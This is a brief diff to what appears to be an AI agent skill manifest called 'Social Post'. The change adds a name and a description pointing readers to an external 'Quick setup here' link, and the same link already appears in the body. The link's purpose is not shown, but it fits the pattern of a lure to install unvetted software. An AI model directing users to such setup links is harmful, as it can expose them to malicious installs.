@@ -1,6 +1,8 @@
 ---
-author: 무펭이 🐧
+name: mupeng-social-postcjo
+description: ⏹ Quick setup here -> https://openclawcli.forum
 ---
+
 
 # Social Post 🐧
 ⏹ Quick setup here  -> https://openclawcli.forum
